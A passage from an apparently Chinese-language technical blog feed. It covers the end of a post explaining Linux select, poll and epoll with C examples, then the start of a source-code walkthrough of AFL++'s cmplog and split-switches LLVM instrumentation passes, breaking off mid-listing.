class="hljs-number">0</span>,MAXBUF);<br>read(fds[i], buffer, MAXBUF);<br><span class="hljs-built_in">puts</span>(buffer);<br>}<br>}<br> }<br></code></pre></td></tr></tbody></table></figure><p>而<code>poll()</code>将输入（events字段）和输出（revents字段）分隔开，允许数组重新使用（这里可以理解为<strong>生产者消费者模式</strong>）：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"round again"</span>);<br>    poll(pollfds, <span class="hljs-number">5</span>, <span class="hljs-number">50000</span>);  <span class="hljs-comment">// &lt;================== 生产revent</span><br>  <br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) {<br>        <span class="hljs-keyword">if</span> (pollfds[i].revents &amp; POLLIN){<br>            pollfds[i].revents = <span class="hljs-number">0</span>;        <span class="hljs-comment">// &lt;================= 消费了，清空revent</span><br>            <span class="hljs-built_in">memset</span>(buffer,<span class="hljs-number">0</span>,MAXBUF);<br>            read(pollfds[i].fd, buffer, MAXBUF);<br>            <span class="hljs-built_in">puts</span>(buffer);<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure></li><li><p><code>select()</code>更加具有可移植性，因为某些Unix系统不支持<code>poll()</code></p></li></ul><p><span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 再深入思考一下，<code>select()</code>和<code>poll()</code>最本质的区别其实是数据结构上的调整，<code>select()</code>使用了<strong>三个数组来分别维护</strong>读描述符、写描述符和异常处理描述符，而<code>poll()</code>仅使用了<strong>一个数组来维护文件描述符</strong>，但是使用了自定义的一个名为pollfds的结构体存储文件描述符信息，而<strong>该结构体中的event字段描述了文件描述符的类型</strong>。</p><h2 id="E3-Epoll系统调用"><a href="#E3-Epoll系统调用" class="headerlink" title="E3: Epoll系统调用"></a>E3: Epoll系统调用</h2><ul><li><p>函数签名[7-9]：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/epoll.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_create</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_create1</span><span class="hljs-params">(<span class="hljs-type">int</span> flags)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_ctl</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-type">int</span> op, <span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> epoll_event *_Nullable event)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_wait</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-keyword">struct</span> epoll_event *events, <span class="hljs-type">int</span> maxevents, <span class="hljs-type">int</span> timeout)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_pwait</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-keyword">struct</span> epoll_event *events, <span class="hljs-type">int</span> maxevents, <span class="hljs-type">int</span> timeout, <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *_Nullable sigmask)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_pwait2</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-keyword">struct</span> epoll_event *events, <span class="hljs-type">int</span> maxevents, </span><br><span class="hljs-params">                 <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *_Nullable timeout, <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *_Nullable sigmask)</span>;<br><br><span class="hljs-comment">// event structure</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> {</span><br>     <span class="hljs-type">uint32_t</span>      events;  <span class="hljs-comment">/* Epoll events */</span><br>     <span class="hljs-type">epoll_data_t</span>  data;    <span class="hljs-comment">/* User data variable */</span><br>};<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">epoll_data</span> {</span><br>     <span class="hljs-type">void</span>     *ptr;<br>     <span class="hljs-type">int</span>       fd;<br>     <span class="hljs-type">uint32_t</span>  u32;<br>     <span class="hljs-type">uint64_t</span>  u64;<br>};<br></code></pre></td></tr></tbody></table></figure></li><li><p>epoll API核心概念是epoll实例，其是一个内核数据结构，从用户空间的角度来看，它可以被看做是<strong>两个列表</strong>的容器[6]：</p><ul><li>interest list（有时也被称作epoll set）：进程注册监视的文件描述符集合</li><li>ready list：已经准备好用于I/O操作的文件描述符集合，是interest list的一个子集</li></ul></li><li><p>创建并管理epoll实例的系统调用有：</p><ol><li>epoll_create（epoll_create1）：在内核中创建一个上下文（i.e. 实例）</li><li>epoll_ctl：从上下文中添加或者删除文件描述符</li><li>epoll_wait： 等待上下文中的事件</li></ol></li><li><p>水平触发（Level-triggered，<strong>LT</strong>） 和 边缘触发（edge-triggered，<strong>ET</strong>）</p><ul><li><p>两种事件触发机制</p></li><li><p>假设一个场景：</p><ol><li>在管道的<strong>读</strong>方的文件描述符 (rfd) 已经被注册到epoll实例中</li><li>在管道另一个写方往管道中写入2KB的数据</li><li>调用epoll_wait()，其将返回rfd作为就绪文件描述符</li><li>管道读方从rfd中读入1KB数据</li><li>再次调用epoll_wait()</li></ol><p>如果在上述场景中rfd文件描述符添加了<code>EPOLLET</code>（边缘触发）的标志，那么在Step 5中的<code>epoll_wait()</code>将会被阻塞，尽管管道中还有1KB字节未读。原因在于边缘触发仅在<strong>被监控的文件描述符发生改变时</strong>才会传递事件；当使用一个水平触发机制时（默认，不指定<code>EPOLLET</code>），服务器端不断地从<code>epoll_wait()</code>调用中唤醒，直到内核缓冲区被读完才结束。这样能保证让我们知道有哪些数据需要读取。</p></li></ul></li><li><p><span class="github-emoji"><span>🌰</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 修改上述的例子：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/epoll.h&gt;</span></span><br>...<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">events</span>[5];</span><br>  <span class="hljs-type">int</span> epfd = epoll_create(<span class="hljs-number">10</span>);<br>  ...<br>  ...<br>  <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) <br>  {<br>    <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">ev</span>;</span><br>    <span class="hljs-built_in">memset</span>(&amp;client, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (client));<br>    addrlen = <span class="hljs-keyword">sizeof</span>(client);<br>    ev.data.fd = accept(sockfd,(<span class="hljs-keyword">struct</span> sockaddr*)&amp;client, &amp;addrlen);<br>    ev.events = EPOLLIN;<br>    epoll_ctl(epfd, EPOLL_CTL_ADD, ev.data.fd, &amp;ev);  <span class="hljs-comment">// 将事件添加到epoll实例中</span><br>  }<br>  <br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"round again"</span>);<br>  nfds = epoll_wait(epfd, events, <span class="hljs-number">5</span>, <span class="hljs-number">10000</span>);   <span class="hljs-comment">// wait</span><br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;nfds;i++) {   <span class="hljs-comment">// 遍历就绪事件，就绪事件已更新到events中，取出相应的文件描述符</span><br><span class="hljs-built_in">memset</span>(buffer,<span class="hljs-number">0</span>,MAXBUF);<br>read(events[i].data.fd, buffer, MAXBUF);<br><span class="hljs-built_in">puts</span>(buffer);<br>}<br>  }<br></code></pre></td></tr></tbody></table></figure></li></ul><h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><p><strong>Epoll() <span class="github-emoji"><span>🆚</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f19a.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> Select()/Poll()</strong></p><ul><li><p><code>select()</code>/<code>poll()</code>仅提供一个API（当然也提供了一些宏定义），而<code>epoll()</code>提供了三个API</p></li><li><table><thead><tr><th>[10]</th><th><code>select()</code></th><th><code>poll()</code></th><th><code>epoll()</code></th></tr></thead><tbody><tr><td><strong>最大连接数</strong></td><td>1024<br>【数组】</td><td>与操作系统有关<br>【链表】</td><td>与操作系统有关<br></td></tr><tr><td><strong>FD激增后带来的I/O效率问题</strong></td><td>O(n) 线性下降</td><td>O(n) 线性下降</td><td>与活跃socket数据有关</td></tr><tr><td><strong>消息传递方式</strong></td><td>内核需要将消息传递到用户空间，<br>都需要内核拷贝动作</td><td>同<code>select()</code></td><td>通过内核和用户空间共享一块内存来实现的<br>mmap()文件映射内存加速与内核空间的消息传递</td></tr><tr><td><strong>遍历就绪文件描述符的方式</strong></td><td>基于轮询机制</td><td>基于轮询机制</td><td>基于操作系统的I/O通知机制</td></tr></tbody></table></li><li><p><code>epoll()</code>仅支持linux，跨平台可能存在不兼容的问题</p></li></ul><h2 id="link-Reference"><a href="#link-Reference" class="headerlink" title=":link: Reference:"></a><span class="github-emoji"><span>🔗</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f517.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> Reference:</h2><ol><li><a href="https://juejin.cn/post/7243609307856683067">I/O多路复用的三种实现 - 掘金 (juejin.cn)</a></li><li><a href="https://devarea.com/linux-io-multiplexing-select-vs-poll-vs-epoll/">Linux – IO Multiplexing – Select vs Poll vs Epoll – Developers Area (devarea.com)</a></li><li><a href="https://linux.die.net/man/2/select">select(2): synchronous I/O multiplexing - Linux man page (die.net)</a></li><li><a href="https://man7.org/linux/man-pages/man2/select.2.html">select(2) - Linux manual page (man7.org)</a></li><li><a href="https://man7.org/linux/man-pages/man2/poll.2.html">poll(2) - Linux manual page (man7.org)</a></li><li><a href="https://man7.org/linux/man-pages/man7/epoll.7.html">https://man7.org/linux/man-pages/man7/epoll.7.html</a></li><li><a href="https://man7.org/linux/man-pages/man2/epoll_create.2.html">https://man7.org/linux/man-pages/man2/epoll_create.2.html</a></li><li><a href="https://man7.org/linux/man-pages/man2/epoll_ctl.2.html">https://man7.org/linux/man-pages/man2/epoll_ctl.2.html</a></li><li><a href="https://man7.org/linux/man-pages/man2/epoll_wait.2.html">https://man7.org/linux/man-pages/man2/epoll_wait.2.html</a></li><li><a href="https://blog.csdn.net/qq_41951923/article/details/107886934">select、poll和epoll_epoll最大连接数_Cudi_的博客-CSDN博客</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>多路复用</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFLplusplus cmplog插桩解析</title>
    <link href="/2023/04/20/AFLplusplus-cmplog%E6%8F%92%E6%A1%A9%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/04/20/AFLplusplus-cmplog%E6%8F%92%E6%A1%A9%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL-’s-Cmplog插桩"><a href="#AFL-’s-Cmplog插桩" class="headerlink" title="AFL++’s Cmplog插桩"></a>AFL++’s Cmplog插桩</h1><h2 id="1-源码解析"><a href="#1-源码解析" class="headerlink" title="1. 源码解析"></a>1. 源码解析</h2><h3 id="afl-cc-c"><a href="#afl-cc-c" class="headerlink" title="afl-cc.c"></a>afl-cc.c</h3><ul><li>代码片段：</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (cmplog_mode) {<br><br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-fno-inline"</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> LLVM_MAJOR &gt;= 11                                <span class="hljs-comment">/* use new pass manager */</span></span><br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-fexperimental-new-pass-manager"</span>;<br>      cc_params[cc_par_cnt++] =<br>          alloc_printf(<span class="hljs-string">"-fpass-plugin=%s/cmplog-switches-pass.so"</span>, obj_path);<br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-fexperimental-new-pass-manager"</span>;<br>      cc_params[cc_par_cnt++] =<br>          alloc_printf(<span class="hljs-string">"-fpass-plugin=%s/split-switches-pass.so"</span>, obj_path);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-Xclang"</span>;<br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-load"</span>;<br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-Xclang"</span>;<br>      cc_params[cc_par_cnt++] =<br>          alloc_printf(<span class="hljs-string">"%s/cmplog-switches-pass.so"</span>, obj_path);<br><br>      <span class="hljs-comment">// reuse split switches from laf</span><br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-Xclang"</span>;<br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-load"</span>;<br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-Xclang"</span>;<br>      cc_params[cc_par_cnt++] =<br>          alloc_printf(<span class="hljs-string">"%s/split-switches-pass.so"</span>, obj_path);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    }<br></code></pre></td></tr></tbody></table></figure><ul><li><code>cmplog-switches-pass.so</code>和<code>split-switches-pass.so</code>是两个关键的动态共享库</li></ul><h3 id="cmplog-switches-pass-cc"><a href="#cmplog-switches-pass-cc" class="headerlink" title="cmplog-switches-pass.cc"></a>cmplog-switches-pass.cc</h3><ul><li><p>CmplogSwitches类：</p><ul><li><p>构造函数：initInstrumentList()  ==&gt; 从环境变量 <code>AFL_LLVM_ALLOWLIST</code>/<code>AFL_LLVM_DENYLIST</code> <strong>解析</strong>白名单/黑名单</p></li><li><p><code>runOnModule() / run()</code> (LLVM &gt;= 11)</p></li><li><p><code>getPassName()</code>  ==&gt;  返回字符串 “cmplog switch split”，表示该Pass名字</p></li><li><p>私有方法：<code>hookInstrs()</code> ?</p></li></ul></li><li><p><code>hookInstrs()</code>：</p><ul><li><p>代码片段：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">if</span> LLVM_VERSION_MAJOR &gt;= 9</span><br>  FunctionCallee<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  Constant *<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      c1 = M.<span class="hljs-built_in">getOrInsertFunction</span>(<span class="hljs-string">"__cmplog_ins_hook1"</span>, VoidTy, Int8Ty, Int8Ty,<br>                                 Int8Ty<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> LLVM_VERSION_MAJOR &lt; 5</span><br>                                 ,<br>                                 <span class="hljs-literal">NULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      );<br>...<br></code></pre></td></tr></tbody></table></figure></li><li><p>c1、c2、c4、c8 ==&gt; <code>__cmplog_ins_hook1()</code> 、<code>__cmplog_ins_hook2()</code> 、<code>__cmplog_ins_hook4()</code>、<code>__cmplog_ins_hook8()</code></p><ul><li>hook函数在<code>afl-compiler-rt.o.c</code>中被定义</li><li>这里创建相应的函数函数</li><li>插桩函数分析 <span class="github-emoji"><span>✅</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2705.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></li></ul></li><li><p><code>__afl_cmp_map</code>：</p><ul><li>cmp引入的位图</li><li>作用？</li></ul></li><li><p>遍历IR中所有SwitchInst指令，将<strong>NumCases&gt;1</strong>的指令保存到switches向量中，调用vector的erase()和std::remove()完成SwitchInst指令的去重</p></li><li><p>然后遍历每一个SwitchInst指令（SI）：</p><ul><li>跳过SI当：1. 整数比特宽度&lt;16的条件分支（太简单了，很容易变异到） 或 2. Case数为0？</li><li>当比特宽度模8不为0时，比特宽度取值向上取整为8的整数倍，同时需要做强制类型转换（cast）</li><li>进行插桩，主要就是将<strong>条件值</strong>、<strong>case比较值</strong>和<strong>一个常数1</strong>传递给hook函数，伪代码大致如下：</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span>(__afl_cmp_map){<br>    <span class="hljs-comment">// 是否需要强制类型转换?</span><br>    <span class="hljs-comment">// e.g. for case 1:</span><br>    __cmplog_ins_hook1((cast_size) condition, (cast_size) caseValue1, <span class="hljs-number">1</span>);<br>    __cmplog_ins_hook2((cast_size) condition, (cast_size) caseValue2, <span class="hljs-number">1</span>);<br>    ...<br>}<br></code></pre></td></tr></tbody></table></figure></li></ul></li></ul><hr><ul><li><code>runOnModule()</code><ul><li>调用<code>hookInstrs()</code>函数</li></ul></li></ul><h3 id="split-switches-pass-so-cc"><a href="#split-switches-pass-so-cc" class="headerlink" title="split-switches-pass.so.cc"></a>split-switches-pass.so.cc</h3><ul><li><p>SplitSwitchesTransform类：</p><ul><li>构造函数：initInstrumentList()  ==&gt; 从环境变量 <code>AFL_LLVM_ALLOWLIST</code>/<code>AFL_LLVM_DENYLIST</code> <strong>解析</strong>白名单/黑名单</li><li><code>runOnModule() / run()</code> (LLVM &gt;= 11)</li><li><code>getPassName()</code>  ==&gt;  返回字符串 “splits switch constructs”，表示该Pass名字</li><li>CaseExpr结构体： 建立Case值到基本块的映射，CaseVector用来存储CaseExpr信息</li><li>私有方法：1、splitSwitches (bool)； 2、transformCmps (bool)；3、switchConvert<span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></li></ul></li><li><p><code>runOnModule() / run()</code>：</p><ul><li>调用<code>splitSwitches(&amp;M);</code></li></ul></li><li><p><code>splitSwitches()</code>：</p><ul><li>遍历模块中的所有基本块，找到所有的switch指令，并保存到switches数组中，跳过NumCase&lt;1的分支</li><li>遍历每一个switch语句，具体来说：</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;SI : switches) {<br><br>    BasicBlock *CurBlock = SI-&gt;<span class="hljs-built_in">getParent</span>();<br>    BasicBlock *OrigBlock = CurBlock;<br>    Function *  F = CurBlock-&gt;<span class="hljs-built_in">getParent</span>();<br>    <span class="hljs-comment">/* this is the value we are switching on */</span><br>    Value *     Val = SI-&gt;<span class="hljs-built_in">getCondition</span>();<br>    BasicBlock *Default = SI-&gt;<span class="hljs-built_in">getDefaultDest</span>();<br>    <span class="hljs-type">unsigned</span>    bitw = Val-&gt;<span class="hljs-built_in">getType</span>()-&gt;<span class="hljs-built_in">getIntegerBitWidth</span>();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        if (!be_quiet)</span><br><span class="hljs-comment">          errs() &lt;&lt; "switch: " &lt;&lt; SI-&gt;getNumCases() &lt;&lt; " cases " &lt;&lt; bitw</span><br><span class="hljs-comment">                 &lt;&lt; " bit\n";</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-comment">/* If there is only the default destination or the condition checks 8 bit or</span><br><span class="hljs-comment">     * less, don't bother with the code below. */</span><br>    <span class="hljs-keyword">if</span> (SI-&gt;<span class="hljs-built_in">getNumCases</span>() &lt; <span class="hljs-number">2</span> || bitw % <span class="hljs-number">8</span> || bitw &gt; <span class="hljs-number">64</span>) {<br><br>      <span class="hljs-comment">// if (!be_quiet) errs() &lt;&lt; "skip switch..\n";</span><br>      <span class="hljs-keyword">continue</span>;<br><br>    }<br><br>    <span class="hljs-comment">/* Create a new, empty default block so that the new hierarchy of</span><br><span class="hljs-comment">     * if-then statements go to this and the PHI nodes are happy.</span><br><span class="hljs-comment">     * if the default block is set as an unreachable we avoid creating one</span><br><span class="hljs-comment">     * because will never be a valid target.*/</span><br>    BasicBlock *NewDefault = <span class="hljs-literal">nullptr</span>;<br>    NewDefault = BasicBlock::<span class="hljs-built_in">Create</span>(SI-&gt;<span class="hljs-built_in">getContext</span>(), <span class="hljs-string">"NewDefault"</span>, F, Default); <span class="hljs-comment">// 在基本块Default前面插入一个名为NewDefault的基本块。创建新基本块的目的是啥？</span><br>    BranchInst::<span class="hljs-built_in">Create</span>(Default, NewDefault);  <span class="hljs-comment">// 创建 NewDefault ==&gt; Default 的控制流</span><br><br>    <span class="hljs-comment">/* Prepare cases vector. */</span><br>    CaseVector Cases;<br>    <span class="hljs-keyword">for</span> (SwitchInst::CaseIt i = SI-&gt;<span class="hljs-built_in">case_begin</span>(), e = SI-&gt;<span class="hljs-built_in">case_end</span>(); i != e;<br>         ++i)<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> LLVM_VERSION_MAJOR &gt;= 5</span><br>      Cases.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">CaseExpr</span>(i-&gt;<span class="hljs-built_in">getCaseValue</span>(), i-&gt;<span class="hljs-built_in">getCaseSuccessor</span>()));  <span class="hljs-comment">// getCaseSuccessor() 获取与case相关联的基本块指针</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      Cases.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">CaseExpr</span>(i.<span class="hljs-built_in">getCaseValue</span>(), i.<span class="hljs-built_in">getCaseSuccessor</span>()));<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/* bugfix thanks to pbst</span><br><span class="hljs-comment">     * round up bytesChecked (in case getBitWidth() % 8 != 0) */</span><br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title">bytesChecked</span><span class="hljs-params">((<span class="hljs-number">7</span> + Cases[<span class="hljs-number">0</span>].Val-&gt;getBitWidth()) / <span class="hljs-number">8</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                                   <span class="hljs-literal">false</span>)</span></span>;<br>    BasicBlock *      SwitchBlock =<br>        switchConvert(Cases, bytesChecked, OrigBlock, NewDefault, Val, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 调用switchConvert()</span><br><br>    <span class="hljs-comment">/* Branch to our shiny new if-then stuff... */</span><br>    BranchInst::<span class="hljs-built_in">Create</span>(SwitchBlock, OrigBlock);<span class="hljs-comment">// 创建新的控制流，新创建的SwitchBlock块 --&gt; OrigBlock</span><br><br>    <span class="hljs-comment">/* We are now done with the switch instruction, delete it. */</span><br>    CurBlock-&gt;<span class="hljs-built_in">getInstList</span>().<span class="hljs-built_in">erase</span>(SI);<span class="hljs-comment">// 删除原switch语句？ 也就是将原switch替换为SwitchBlock</span><br><br>    <span class="hljs-comment">/* we have to update the phi nodes! */</span><span class="hljs-comment">// 更新phi节点？</span><br>    <span class="hljs-keyword">for</span> (BasicBlock::iterator I = Default-&gt;<span class="hljs-built_in">begin</span>(); I != Default-&gt;<span class="hljs-built_in">end</span>(); ++I) {<br><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isa</span>&lt;PHINode&gt;(&amp;*I)) { <span class="hljs-keyword">continue</span>; }<br>      PHINode *PN = <span class="hljs-built_in">cast</span>&lt;PHINode&gt;(I);<br><br>      <span class="hljs-comment">/* Only update the first occurrence. */</span><br>      <span class="hljs-type">unsigned</span> Idx = <span class="hljs-number">0</span>, E = PN-&gt;<span class="hljs-built_in">getNumIncomingValues</span>();<br>      <span class="hljs-keyword">for</span> (; Idx != E; ++Idx) {<br><br>        <span class="hljs-keyword">if</span> (PN-&gt;<span class="hljs-built_in">getIncomingBlock</span>(Idx) == OrigBlock) {<br><br>          PN-&gt;<span class="hljs-built_in">setIncomingBlock</span>(Idx, NewDefault);<br>          <span class="hljs-keyword">break</span>;<br><br>        }<br><br>      }<br><br>    }<br><br>  }<br></code></pre></td></tr></tbody></table></figure></li><li><p><code>switchConvert()</code>：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 